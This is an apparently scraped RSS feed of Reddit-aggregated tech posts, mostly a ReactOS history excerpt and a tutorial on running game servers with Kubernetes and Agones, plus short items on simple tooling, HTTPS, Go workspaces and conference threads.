In response, Steven Edwards strengthened the projectâ€™s intellectual property policy and the project made the difficult decision to audit the existing source code and temporarily freeze contributions.The ongoing audit and contribution freeze from the end of the ReactOS 0.2.x era slowed development and momentum considerably for ReactOS 0.3.x.
Following challenges with the audit, Steven Edwards stepped down as project coordinator and Aleksey Bragin assumed the role by August 2006.Despite the challenges during this time, ReactOS 0.3.x continued to build upon ReactOSâ€™s legacy.
ReactOS 0.3.0 was released on August 28th, 2006.
It introduced networking support and a package manager called â€œDownload!â€.
This package manager would become the basis for RAPPS, the package manager built into modern versions of ReactOS.
In July 2008, the x86_64 port of ReactOS was started.
One year later, ReactOS 0.3.10 imported the UniATA driver, written by Alexandr Telyatnikov (Alter).
While we run into limitations with the UniATA driver today, UniATA enabled ReactOS to support SATA storage devices and to support partitions greater than 8GB in size.
On February 8th, 2012, ReactOS 0.3.14 supported being built using the MSVC compiler and added visual style support.Download!, the package manager for ReactOS 0.3.x2016-Today: ReactOS 0.4.xReactOS 0.4.0 was released on February 16th, 2016.
It introduced a new graphical shell that utilized more Windows features and was more similar architecturally to Windows Explorer.
ReactOS 0.4.0 also introduced support for kernel debugging using WinDbg when compiled with MSVC.
Being able to use standard Windows tools for kernel debugging has helped us progress considerably.
ReactOS 0.4.0 continued to receive incremental updates every few months up until versions 0.4.14 and 0.4.15 which had years of development updates each.
Today, the x86_64 port of ReactOS is similarly functional to its x86 counterpart, but with no WoW64 subsystem to run x86 apps its usability is limited.A humorous diagram made in 2015 to explain the complexity of Windows ExplorerReactOS 0.4.15 desktop, shown with Luna visual style and large taskbar icons appliedWeâ€™re continuing to move ReactOS forward. Behind the scenes there are several out-of-tree projects in development. Some of these exciting projects include a new build environment for developers (RosBE), a new NTFS driver, a new ATA driver, multi-processor (SMP) support, support for class 3 UEFI systems, kernel and usermode address space layout randomization (ASLR), and support for modern GPU drivers built on WDDM.The future of ReactOS will be written by the people who believe in the mission and are willing to help carry it forward.Note: Statistics were calculated at commit f60b1c9Total unique contributors: 301Total lines of code: 14,929,578]]></content:encoded></item><item><title>[D] AISTATS 2026 Paper Acceptance Result</title><link>https://www.reddit.com/r/MachineLearning/comments/1qjuitb/d_aistats_2026_paper_acceptance_result/</link><author>/u/mathew208</author><category>ai</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 13:28:29 +0000</pubDate><source url="https://www.reddit.com/r/MachineLearning/top/?sort=top&amp;t=day&amp;limit=3">Reddit - ML</source><content:encoded><![CDATA[AISTATS 2026 acceptance decisions are being released today. This thread is for discussing this yearâ€™s outcomes.   submitted by    /u/mathew208 ]]></content:encoded></item><item><title>Prominent Intel Compiler Engineer Heads Off To AMD</title><link>https://www.phoronix.com/news/Intel-Compiler-Expert-Now-AMD</link><author>/u/anh0516</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 13:24:57 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[Michael Larabel is the principal author of Phoronix.com and founded the site in 2004 with a focus on enriching the Linux hardware experience. Michael has written more than 20,000 articles covering the state of Linux hardware support, Linux performance, graphics drivers, and other topics. Michael is also the lead developer of the Phoronix Test Suite, Phoromatic, and OpenBenchmarking.org automated benchmarking software. He can be followed via Twitter, LinkedIn, or contacted via MichaelLarabel.com.]]></content:encoded></item><item><title>[R] CVPR 2026 Reviews today</title><link>https://www.reddit.com/r/MachineLearning/comments/1qjub2g/r_cvpr_2026_reviews_today/</link><author>/u/gentaiscool</author><category>ai</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 13:18:57 +0000</pubDate><source url="https://www.reddit.com/r/MachineLearning/top/?sort=top&amp;t=day&amp;limit=3">Reddit - ML</source><content:encoded><![CDATA[How's your reviews and chances?]]></content:encoded></item><item><title>Helm + container images across clusters... need better options</title><link>https://www.reddit.com/r/kubernetes/comments/1qjscp3/helm_container_images_across_clusters_need_better/</link><author>/u/Timely-Dinner5772</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 11:42:25 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[Running container images via Helm across clusters is a mess. Every small change in image or values can break stuff. Charts get messy fast. Env overrides, tags, versions all pile up. i tried Chainguard for auditing and building images but it feels heavy and rigid for our setup. Any sug for something lighter or more flexible that works at scale? Workflows, tools, whatever. Need ideas.]]></content:encoded></item><item><title>Do not fall for complex technology</title><link>https://rushter.com/blog/complex-tech/</link><author>/u/f311a</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 11:31:28 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[Fifteen years ago, I wanted to set up a note-taking system.
At the time, Evernote was the tool everyone was talking about, so choosing it seemed like the right and easy decision.After storing around 500 notes for eight years, Evernote became a mess to use.
It was bloated, heavily monetized, and slow to work with. So I wanted to switch.About that time came Notion. Everyone was talking about it. I jumped on the bandwagon and migrated a few hundred of
my notes to it that were still relevant. It did not even occur to me that switching from a bloated and slow app to
a web app would result in a similar outcome later. I followed a popular choice again.After struggling for a year, I switched to Markdown notes and a plugin for an editor that renders inline images.
I'm still using this to this day. It is simple, and I will be able to open my notes 10-20 years later.
I can edit them in any editor. It works offline and does not depend on commercial products.
I encrypt my notes locally so they can be stored safely on any cloud service.I don't even use images anymore, so this could be simple plain-text files.
Why did no one tell me that I can start simple and switch to a complex system if I really need it?It took me almost ten years to understand that, don't be like me!This process never stops. There are now Roam Research and Obsidian, where people spend more time organizing
notes than writing them. Some people become obsessed with documenting everything and never reading it anymore, just
because everyone talks how cool it is.Remember the peak of popularity of microservices and the use of GraphQL?
Small teams of 3-5 developers used them to build simple web apps
just because it was cool and big tech was writing about it a lot.Simple systems became more complex for no benefit. A complex working system should only grow from a simple one.
You need to gather initial knowledge and requirements about your project first. Iterating a simple system is much
faster and easier. When a project starts, things change a lot. It's common to rewrite the whole project from scratch 2-3
times in startups just because the initial prototype resulted in so much technical debt and bad decisions. I had experienced this
multiple times at my jobs. Not every system should be complex in the first place.If you can only start with a complex system, there is a high chance it's broken by design.The list of complex technologies is very big and I can go on and on.
Oftentimes, you don't need to use ten cloud services, hundreds of serverless functions and so on.
Not only can it be simpler, but it can also be faster and cheaper too!
You just need to ask yourself why you need a particular technology in this
project first. Sometimes the hardest part is to convince the management, though.In blogging circles, one of the popular topics is "I migrated my blog from X to Y". Some people change
their blog engines 3-4 times and I'm not an exception.I started with WordPress, then I migrated to Django, and right now my blog is completely static.When I was using Django, I needed a good server with proper caching so that when traffic spikes, it can handle it.Right now, I don't need a database. Hosting static HTML files is simple, and you can do it for free.
The only dynamic part is  comments. I'm using CloudFlare workers with a simple 50-line script that just
stores comments in Cloudflare Workers KV.They are not loaded dynamically. I just import them to markdown
files and regenerate the blog. There is no database to serve them. They are preserved in markdown forever.The whole blog engine is 800 lines of Python code that supports comments, RSS, categories, and so on.
I know exactly how it works, and adding new features is super easy. There is also nothing to hack.
Internally, static website generators are pretty complex to handle various use cases.
But, if I were using a popular static generator, adding custom features would be still hard.A lot of companies are trying to force AI everywhere. Look at Microsoft, they added it everywhere.
In most cases, it does not make the life of a user easier. In the case of Microsoft, it actually results in more bugs
and the worst UI. This time, ignoring complexity is much harder for a user, so the best shot is to switch to Linux where you have full control.I think about this a lot. It's easy to spot problems in other products, but the product that you are working on
can suffer from the same problems. It's harder to notice, especially when you don't use it.Another problem with LLMs is that it is much easier to add new features to your project now.
If you use LLMs, keep things simple and the scope of changes limited.
When you aim for big changes, the code quality drops significantly.
You stop paying attention to the changes to the point that you stop understanding how things work.There is an old tale regarding code reviews. A team lead reviewed 100 lines of code and found three bugs.
After that, he reviewed 1500 lines PR and found zero bugs. This happened because the scope of the changes was so big,
that his brain just refused to concentrate on every change.The quality of LLM output depends on code size, too.
Their context is limited, and the bigger and more complex the codebase, the worse they perform.]]></content:encoded></item><item><title>A clear visual explanation of what HTTPS protects</title><link>https://howhttps.works/why-do-we-need-https/</link><author>/u/Digitalunicon</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 11:13:10 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[We need HTTPS for 3 reasons.Privacy, integrity, and identification.Let's talk about privacy first.When you browse to a website without HTTPS, I could be eavesdropping on your password.Reason number 2: integrity.I am sending another message to Browserbird unencrypted.But before it reaches Browserbird, I intercept the message.I update the message to say bad things about Browserbird and forward it to him.Why would Compugter say such things about me?And crab-in-the-middle attacks are the worst.I make sure that your communication is not being tampered with.Reason number 3: identification.Identification means that I can check that this message is coming from Compugter.HTTPS, via SSL certificates, ensures you are connected exactly with the receiver you would expect.This SSL certificate is valid and has been issued by a legitimate Certificate Authority. You are good to go.We'll be talking more about SSL certificates and Certificate Authorities soon, so stay tuned.Next on HowHTTPS.works...Now that we know the why, the next step is to understand symmetric and asymmetric encryption. Big words, but easy concepts.]]></content:encoded></item><item><title>90% of Salesforceâ€™s Engineers Use Cursor Every Day</title><link>https://analyticsindiamag.com/ai-news-updates/90-of-salesforces-engineers-use-cursor-every-day/</link><author>/u/Ok-Elevator5091</author><category>ai</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 11:12:20 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>[Media] musicfree: a cross-platform music downloader implemented in Rust</title><link>https://www.reddit.com/r/rust/comments/1qjqq51/media_musicfree_a_crossplatform_music_downloader/</link><author>/u/Every_Juggernaut7580</author><category>rust</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 10:07:17 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[musicfree is a music download tool written in pure Rust. It supports multiple platforms, including Windows, macOS, Unix, and Android. There are two versions available: a CLI version at musicfree and a Tauri version at musicfree-tauri.Currently, it supports downloading single videos from YouTube and Bilibili, downloading playlists, and cover images.]]></content:encoded></item><item><title>Naked Steel: The Deep Tech &amp; Security of Bare Metal</title><link>https://v.redd.it/9nal1fg8iveg1</link><author>/u/Appropriate_Way4135</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 10:02:24 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Making and Scaling a Game Server in Kubernetes using Agones</title><link>https://noe-t.dev/posts/making-and-scaling-a-game-server-in-k8s-using-agones/</link><author>/u/noe__0</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 09:42:46 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[If youâ€™re interested in Kubernetes like I am, youâ€™ve probably found yourself exploring related projects on GitHub and you might have stumbled upon a repository called Agones. If youâ€™ve never heard about it, Agones is a project created by Google to manage and deploy video game servers on Kubernetes.Recently, I dipped my toes in the water and tried it out. I had a lot of fun doing so and I want to share everything I learned. In this article, we will go over the following:The creation of a basic .Integrating it with .Its deployment on .The making of a matchmaking service in Go.Setting up and benchmarking  for our infrastructure based on the matchmakingâ€™s player queue.Iâ€™ll share a lot of relevant code snippets and diagrams, but if you want to get the full picture, you can find the source code and the Kubernetes manifests in this GitHub repository:Before going any further, we need to address a question regarding Agones:  That was my first reaction upon discovering Agones because, in theory, anyone can just deploy their game server as a regular deployment on a cluster, right? Well, things are actually a bit more complicated than that.If you look into the Agones documentation, you will find this section which basically answers the question. To put it simply, game server workloads are both stateful and stateless. An empty game server is stateless and can be safely deleted or moved, while a game server with players probably has in-memory state and must not leave the node.In other words, Agones allows you to manage and scale game server workloads based not only on CPU, memory, or traffic but also on . Thanks to that, you can update game servers without shutting down servers with active players, reuse a game server on which a game has ended or even set autoscaling based on the number of full game servers. And much more.Developing a game server in GoTo start, we obviously need a game to work with. For this purpose, I will be making a quick and simple game of  in Go.Since this is just a simple demo, I wonâ€™t be trying to make something grandiose. It will just be a basic HTTP server with a WebSocket on which two players will connect to battle. For a real game, you would probably want to use UDP connections.Both players will be connected to the WebSocket and will have to select their move. The connection stays open for both players until they both selected a move. Once both players chose their moves, the server sends the winner to them.To do this, I used standard Go packages such as  and github.com/gorilla/websocket.The root path () serves the index.html file (which is embedded in the binary) and the  path serves the WebSocket connection.The index.html is just a very basic web page with buttons for each move (rock, paper, scissors). It uses JavaScript to send a message to the WebSocket when a button is clicked. Results are displayed in the  div.I wonâ€™t go too much into details about the game logic since, well, itâ€™s just a simple game of rock paper scissors.The game loop is fully coded in the WebSocket handler, and it uses methods from the  package located in . Hereâ€™s a basic overview of what this handler does:If you try to make something similar, keep in mind that you have to handle what happens when a player disconnects or leaves the game. In this case, I just made it so the player gets deleted from the game allowing them or someone else to rejoin. You may want to just end the game or kick everyone else if one of the players disappears.In order to manage concurrency, I use a simple  to ensure that the player list and moves are not modified at the same time. Before every operation, I lock the mutex and unlock it after the operation is complete. For example:Upon game end, the WebSocket connections are closed and the game server shuts down.The end result looks like this:Very impressive, isnâ€™t it? Jokes aside, this simple multiplayer game will be more than enough for us to get started with Agones.Adding Agones to a game serverNow that we have a game server ready, we need to make some tweaks in order to deploy it with Agones. If you try to deploy it as of right now, it will just crash as Agones expects your container to send regular ping.To explain briefly how things work in Agones, when deploying a game server, we use the well named  resource. You can think of GameServers as the equivalent of Pods in the Agones world. They are what will be running your game server container.The main difference with regular Pods is that GameServers run your image alongside an  which is responsible for managing the lifecycle of the game server. This sidecar is responsible for ensuring that the game server is healthy and available for players. It communicates with the Kubernetes API to update the GameServer resource status.---
title: GameServer Architecture
config:
  look: handDrawn
---
graph TD
    KubeAPI["kube-apiserver"]

    subgraph GameServer["GameServer"]
        subgraph Pod["Pod"]
            GameContainer["**Your Game Server** *Container*"]
            AgonesSidecar["**agones-sdk** *Container*"]

            GameContainer <-->|SDK gRPC| AgonesSidecar
        end
    end

    AgonesSidecar -->|HTTP PATCH GameServer resource| KubeAPI
The bare minimum to get your game server up and running with Agones is to implement a . To do this, we first need to import the Agones Game Server Client SDK. In my case, I will be importing the Go package but there are also SDKs for other languages such as Java or C++ and also for game engines such as Unity or Unreal Engine.Even if your language or game engine doesnâ€™t have an SDK, you can still use Agones by making and deploying a sidecar container alongside your game server. This sidecar container would be responsible for communicating with Agones and you would just need to communicate with your game binary. Or else, you can just communicate directly with Agones using the gRPC API or the HTTP API which should be supported by most languages.Once we have our SDK installed, we need to actually implement the health check. This is usually done by creating a loop that sends a ping to Agones every few seconds. Hereâ€™s how you can do it in Go:Now, we can technically already deploy our game server on a Kubernetes cluster with Agones by creating a  with our game container image. However, we are far from production-ready. We still need to at least implement the following Agones functions: - To indicate that the game server is ready to accept connections from players. - To tell Agones to shut down the game server.Implementing the  function is pretty straightforward. We just need to call it from the SDK when starting the game server:For the  function, things are a bit more complicated. What we want to do is to implement a graceful shutdown process. Basically, it means that we need our server to handle signals like  by waiting for everything to complete before shutting down. It is especially important in order to avoid loss of player data or of an unsaved game for instance.Fortunately, this pattern is pretty easy to implement in Go. We will be using the context package to handle cancellation and timeouts coupled with the signal package to handle, as its name implies, signals.We are first going to need to create a context that will be used all throughout our server. In order to have it be cancellable with Unix signals, we will be creating it using  from the  package. We can then, at the end of our  function, have all of our code for shutting down our server after .Currently, we handle shutdown from signals correctly, but not necessarily gracefully. In general, when implementing this pattern, we want to ensure that all ongoing operations are completed before shutting down. In our case, this isnâ€™t really important as the process of shutting down the client SDK and the HTTP server should be pretty straightforward.However, letâ€™s say youâ€™re making an actual game: you may want to save the result of your game to a database, for example. In Kubernetes, Pods getting deleted are first sent a , and have a grace period of 30 seconds. After that, Kubernetes sends a , which you want to avoid if possible. If for some reason the database youâ€™re sending your data to is experiencing issues, you will want to rollback your transaction before being forcefully terminated.We can achieve this by having a timeout, and to do that, weâ€™re going to make, once again, a new context, but with  this time around. This way, we will be able to pass down the context with timeout to our different shutdown functions and ensure that our game server is properly shut down in a given amount of time.In my case, I set it up with a timeout of 10 seconds. This is more than enough for the Agones client SDK and the HTTP server to shut down gracefully.With all of this, we now have the lifecycle of our game server fully implemented and ready to be deployed alongside Agonesâ€™ SDK sidecars in actual  resources.Now that we have our game server ready, we can deploy it on a Kubernetes cluster. Iâ€™m using a basic kind cluster for this example, but you can use any Kubernetes cluster you want. The only important requirement is to install Agones on your cluster. To do so, you can simply use Helm chart like so:We will be deploying our game server in the  namespace. If you want to deploy yours in a different one, you may need to change some values in your Helm deployment of Agones.Once we have our cluster ready with Agones up and running, we can start by deploying our game server image in a simple GameServer resource:You should then be able to see it by running . You should see something like this:Notice how Agones picked a random port between 7000 and 8000 for the game server. This port is exposed on the host nodeâ€™s network using the hostPort field of Pods. This means that you can access the game server directly from your host machine using the IP address and port number.You can even check its events to see the different steps it went through:Which should give you something like this:You should be able to access the game directly from your web browser by visiting .Next, we can deploy the game server in a Fleet. If GameServers are the equivalent of Pods, you can think of Fleets as the equivalent of Deployments or StatefulSets. They allow us to have replicas of our GameServer and scale them up and down without killing active game servers. We can create one just like so:We can then check the GameServers it created:This fleet can easily be scaled up by running :But, right now, if you try to scale it down, it could kill active GameServers. What we want to do in order to avoid that is to use a GameServerAllocation. This type of resource allows us to set its state from  to , which will prevent Agones from deleting that GameServer. Letâ€™s allocate a random GameServer from our fleet with :Now, letâ€™s do something a bit extreme and scale the fleet down to 0 replicas:If you look at the list of GameServers, youâ€™ll notice that the one we allocated is still there:This is great, as we managed to scale down without stopping a GameServer that has been marked as being allocated for a game. If you go ahead and finish playing a game on this server, youâ€™ll notice that the GameServer gets automatically deleted.Of course, in real life, you would probably use the Kubernetes API to allocate our GameServers instead of using kubectl. This way, we can automate the allocation process without manual intervention.Making a matchmaking serviceSo far, we managed to make a game server, hook it up to Agones and deploy it on a Kubernetes cluster. All of this is great but itâ€™s nothing we couldnâ€™t have achieved by simply using regular Kubernetes resources such as Deployments or StatefulSets. But now that we have everything set up, we can actually go a bit further and exploit Agonesâ€™ features to have a  which will scale our game servers automatically based on demand ðŸš€.Or, at least, thatâ€™s what weâ€™re going to do in the next part of this post. For now, weâ€™ll focus on making a matchmaking service that will match 2 players together and will allocate a GameServer to them.If you look online, you might find an open-source solution for matchmaking called Open Match. It has been made by Google, and it can work with Agones, which is great. However, as of writing this, there hasnâ€™t been any update in over 2 years. A second version of Open Match called Open Match 2 seems to be planned but there are no releases yet and only a single person seems to be working on it.Hereâ€™s what weâ€™ll be working with:---
config:
  look: handDrawn
---
sequenceDiagram
    participant Player as ðŸ‘¤ Player
    participant WebSocketServer as ðŸŒ HTTP Server
    participant Topic_matchmaking as ðŸ“‡ Topic: matchmaking
    participant Matcher as âš™ï¸ Matcher
    participant Topic_match_results as ðŸ“‡ Topic: match_results_{playerID}
    participant KubernetesAPI as â˜¸ï¸ Kubernetes API

    Player->>WebSocketServer: Connect via WebSocket
    WebSocketServer->>WebSocketServer: Generate playerID
    WebSocketServer->>Topic_match_results: Subscribe
    WebSocketServer->>Topic_matchmaking: Publish playerID

    Topic_matchmaking->>Matcher: Deliver playerID

    alt No one waiting
        Matcher->>Matcher: Store playerID as waiting
        Note right of Matcher: Wait for next player
    else Another player waiting
        Matcher->>KubernetesAPI: Allocate GameServer
        KubernetesAPI-->>Matcher: GameServer address
        Matcher->>Topic_match_results: Publish match for both players
        Topic_match_results->>WebSocketServer: Deliver match result
        WebSocketServer->>Player: Redirect to match-ip:port
    end
For simplicityâ€™s sake, I copied the base structure of the game server and reused it in the matchmaking service. This is why we are once again working with an HTTP server serving a WebSocket on . This time, we redirect the player by opening the web page the matchmaking service will return.The core component of this matchmaking system is the . As you can see on the diagram, we are working with two topics:: Player requests for a match.: Topics for the response to the player.The brain of the operation is named the , and is basically a process that will take a player from the queue and match them with another one. Once a match is made, it will reserve a GameServer by creating a  through the Kubernetes API. It then sends them both the server address they need to join via the match results topic of both player.To work with Pub/Sub in Go, weâ€™ll be using a great library called Watermill, which will simplify the task a lot. Whatâ€™s great about this library is that it works with a lot of different options, including Kafka, RabbitMQ or even PostgreSQL. To keep things simple, I chose to go with a simple Go Channel which you can also use as a Pub/Sub with Watermill.Hereâ€™s how the WebSocket handler initiates the matchmaking process and waits for a match result with Watermill:As you can see, itâ€™s pretty straightforward with functions such as  and .Thatâ€™s basically it for the â€œfrontendâ€ part of the matchmaking service, but thereâ€™s a second part which is called the matcher. It runs as a goroutine but it could be run as a separate service if we were to use another Pub/Sub. Itâ€™s responsible for matching two players from the  queue.To do that, I used a Router from Watermill, which gives a lot of features that are pretty nice to build event-driven systems. In our case, Iâ€™m just using it to add a handler for the  topic, which can be done just like this:Handler functions in Watermill work like you would expect, by taking a message as input to process it.Whatâ€™s really important are the parts that are highlighted. You should be able to see the basic matchmaking logic which is to set a player as  if no other player is waiting. And when a second player joins, match them together and publish the result to both players.Last but not least, we have to take a look at the  function which allocates a random GameServer and returns its IP and port. To do that, I simply use the Kubernetes API to create a resource like we made earlier.However, if you try deploying the matchmaking service just like that with a Deployment, it will actually not do anything. This is because by default, we are using the  ServiceAccount to access the Kubernetes API from our Pod. To fix this, we just need to create a new  and a  that grants the necessary permission to create  resources.And then, we can use this newly created ServiceAccount in our Deployment:Now, we can just create a Service for this Deployment and access it using port-forwarding like that:If we access the matchmaking service at  and try to play a game, we get this:As you can see from the screen briefly flashing to black, the matchmaking service indeed redirects to a game server once a match is found.Something to keep in mind is that in its current state, the matchmaking is not scalable. You canâ€™t really run multiple instances of the matchmaking as you could end up with players stuck in different matcherâ€™s instances.However, it shouldnâ€™t really matter as you can shard the matchmaking service by region (eu, us, etc.) or skill-level (Elo, rank). Then, you can have an instance of the matchmaking service for each shard. For example, you could have an instance running only on eu.elo100-200.matchmaking and one on us.elo100-200.matchmaking.Also, I used a WebSocket again because I shamelessly copy-pasted the code from the game server as the base for the matchmaking service. However, you would be better off using an HTTP API where you issue a ticket and poll the match result. Or, maybe even SSE?Setting up autoscaling of game serversEverything works pretty well so far, right? Well, thereâ€™s still a problem that remains to be solved. If youâ€™ve followed along until now, so far we have a game running on Agones. There are multiple instances and a matchmaking service that routes each player to one of them. However, if we have 6 players all playing at the same time, weâ€™ll end up with our 3 games instances being allocated, making it impossible for the matchmaking service to find a game for any new players.To solve this issue, we have to set up  for our fleet of game servers. To do that, we need to create a FleetAutoscaler:I set it up with a  which ensures that thereâ€™s always a buffer of ready game servers available. In this case, I set it to 10 instances which are checked every 5 seconds.There are other policies which are also interesting to look at such as:The counter policy which scales based on a GameServer counter. It can be useful if you set up multiple rooms in a single game instance like I mentioned earlier.The webhook policy which allows us to scale based on a custom logic we can implement as a webhook handler. We can, for instance, scale it based on the number of players waiting in the matchmaking system.The WASM policy which as its name implies, allows us to scale based on a custom logic using WebAssembly modules. I have yet to find a use case for it, but itâ€™s definitely interesting to explore.The Schedule policy which is pretty neat as it allows us to set a policy for a specific time period. It can be useful to scale up during an event or for the release of a game, for example.For simplicityâ€™s sake, weâ€™ll continue with the buffer policy as it works decently well if we set the sync interval to a low value.Now, for the fun part, letâ€™s put this autoscaling to the test!Thereâ€™s a tool called k6 which is a load testing tool made by Grafana that can be used to simulate a large number of users connecting to our game server. We can use it to test our autoscaling policy and see how it performs under load. It simulates users with a custom script that can be written in JavaScript.Hereâ€™s the one I made for this project:As you can see, this script  opens the WebSocket connection with the matchmaking service and just sends a GET request to the game server.Weâ€™ll be running this script in k6 with 100 virtual users for a duration of 30 seconds.As you can see, the autoscaler has a hard time keeping up with the load. To avoid that, we can increase the buffer size and decrease the sync interval. Or even better, switch to the webhook policy and implement a webhook endpoint which exposes the number of players currently waiting for a game server allocation.This little experiment with Agones took longer than I first expected it to be, but I learned a lot and had quite some fun. Overall, I would say that Agones is very interesting in the way it transforms how we work with Kubernetes.I think making a game and a matchmaking system from scratch to work with Agones really helped me understand better how concepts would work together. I understood so much more about Agones doing it this way than I did at first when going through the documentation.Still, there are many things I havenâ€™t tried, such as the other autoscaling policies, using counters and lists, or just working with an actual game server with real-time communication in UDP. There are also related projects such as Quilkin which is a UDP proxy that can be used to route traffic to game servers and seems to work well with Agones.I hope this article has been helpful for you and that you have learned something new about Agones and Kubernetes. I would appreciate any feedback you might have on this article. Thank you for reading!]]></content:encoded></item><item><title>New release of my RSS feed reader (v0.5)</title><link>https://www.reddit.com/r/golang/comments/1qjpq1d/new_release_of_my_rss_feed_reader_v05/</link><author>/u/proc_</author><category>golang</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 09:04:42 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Yesterday I released a new version of my RSS feed reader written in Go. Fixed a lot of issues reported by users and added a few new features as well.Enjoy and any feedback/PR's are welcome!   submitted by    /u/proc_ ]]></content:encoded></item><item><title>Using Go Workspaces? Stop scripting loops and use the work pattern</title><link>https://www.reddit.com/r/golang/comments/1qjngob/using_go_workspaces_stop_scripting_loops_and_use/</link><author>/u/jayp0521</author><category>golang</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 06:46:53 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[â€‹I haven't seen this discussed much in articles or tutorials, so I wanted to share a massive quality-of-life feature I stumbled across while digging through PRs.If you use Go Workspaces, you have probably tried running `go generate ./...` from the root, only to find it fails or ignores your modules. Usually, the "fix" is searching online and finding hacky scripts involving sed, xargs, or manually iterating through every module one by one. It is annoying and brittle.It turns out there is a native, elegant way to run commands against every module in your go.work file simultaneously. You simply use work as the package target.Even AI assistants seem to hallucinate or get confused when I ask about this, likely because itâ€™s a newer pattern that hasn't made it into the training data yet. Hopefully, this saves you some scripting time! Believe you need 1.25+]]></content:encoded></item><item><title>[D] Which data design patterns have held up for you in production?</title><link>https://www.reddit.com/r/MachineLearning/comments/1qjmqy8/d_which_data_design_patterns_have_held_up_for_you/</link><author>/u/Aggravating_Map_2493</author><category>ai</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 06:07:01 +0000</pubDate><source url="https://www.reddit.com/r/MachineLearning/top/?sort=top&amp;t=day&amp;limit=3">Reddit - ML</source><content:encoded><![CDATA[I came across this article on data design patterns and found it grounded in real system behavior rather than tools. It walks through patterns that show up when supporting ML and AI workloads at scale. After reading this , I was curious to hear from others here: which patterns you rely on most, which ones failed under scale and patterns you think are overused. I am keen on hearing more about failures and lessons learned than success stories from people who have been there and done that.]]></content:encoded></item><item><title>High cardinality explained with interactive examples</title><link>https://signoz.io/blog/high-cardinality-data/</link><author>/u/ankit01-oss</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 05:23:11 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Essay: Performance Reviews in Big Tech: Why â€œFairâ€ Systems Still Fail</title><link>https://medium.com/@dmitrytrifonov/big-tech-performance-review-01fff2c5924d</link><author>/u/NoVibeCoding</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 04:57:43 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Satya Nadella at Davos: a masterclass in saying everything while promising nothing</title><link>https://jpcaparas.medium.com/satya-nadella-at-davos-a-masterclass-in-saying-everything-while-promising-nothing-8495c75c5ba3?sk=a6efaf2b6a15adefcf82403ff62ef8da</link><author>/u/jpcaparas</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 04:39:02 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>This Week in Rust #635</title><link>https://this-week-in-rust.org/blog/2026/01/21/this-week-in-rust-635/</link><author>/u/b-dillo</author><category>rust</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 04:13:35 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[This week's crate is throttled-tracing, a crate of periodic and throttled logging macros.An important step for RFC implementation is for people to experiment with the
implementation and give feedback, especially before stabilization.If you are a feature implementer and would like your RFC to appear in this list, add a
 label to your RFC along with a comment providing testing instructions and/or
guidance on which aspect(s) of the feature need testing.Let us know if you would like your feature to be tracked as a part of this list.Always wanted to contribute to open-source projects but did not know where to start?
Every week we highlight some tasks from the Rust community for you to pick and get started!Some of these tasks may also have mentors available, visit the task page for more information.No Calls for participation were submitted this week.If you are a Rust project owner and are looking for contributors, please submit tasks here or through a PR to TWiR or by reaching out on Bluesky or Mastodon!Are you a new or experienced speaker looking for a place to share something cool? This section highlights events that are being planned and are accepting submissions to join their event as a speaker. | CFP closes 2026-02-16 | Montreal, Quebec, Canada | 2026-09-08 - 2026-09-11If you are an event organizer hoping to expand the reach of your event, please submit a link to the website through a PR to TWiR or by reaching out on Bluesky or Mastodon!Various changes in both direction, but not much has changed overall.Improvements âœ…  (secondary)3 Regressions, 4 Improvements, 7 Mixed; 6 of them in rollups
40 artifact comparisons made in totalEvery week, the team announces the 'final comment period' for RFCs and key PRs
which are reaching a decision. Express your opinions now.Let us know if you would like your PRs, Tracking Issues or RFCs to be tracked as a part of this list.Rusty Events between 2026-01-21 - 2026-02-18 ðŸ¦€If you are running a Rust event please add it to the calendar to get
